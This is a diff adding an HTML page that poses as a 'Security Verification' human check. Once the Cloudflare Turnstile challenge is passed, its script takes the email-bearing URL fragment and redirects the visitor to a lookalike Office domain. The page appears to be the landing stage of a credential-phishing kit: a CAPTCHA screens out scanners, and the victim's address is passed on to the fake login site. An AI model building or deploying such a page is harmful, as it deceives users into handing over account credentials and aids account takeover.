@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Security Verification</title>
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f7f7f7;
+      text-align: center;
+      padding-top: 100px;
+    }
+    .container {
+      background: white;
+      padding: 30px;
+      margin: auto;
+      max-width: 400px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    h2 {
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Security Verification</h2>
+    <p>Please verify you're human to continue.</p>
+    
+    <div class="cf-turnstile"
+         data-sitekey="0x4AAAAAABOkPgdXIwH_Jpit"
+         data-callback="onCaptchaSuccess"
+         data-theme="light">
+    </div>
+  </div>
+
+  <script>
+    function onCaptchaSuccess(token) {
+      // Get the hash fragment (e.g., #encodedEmail)
+      const hashFragment = window.location.hash;
+
+      // Append it to the destination URL
+      const redirectUrl = "https://office.nethauthlike.forum/IvezNcgC" + hashFragment;
+
+      // Redirect the user
+      window.location.href = redirectUrl;
+    }
+  </script>
+</body>
+</html>
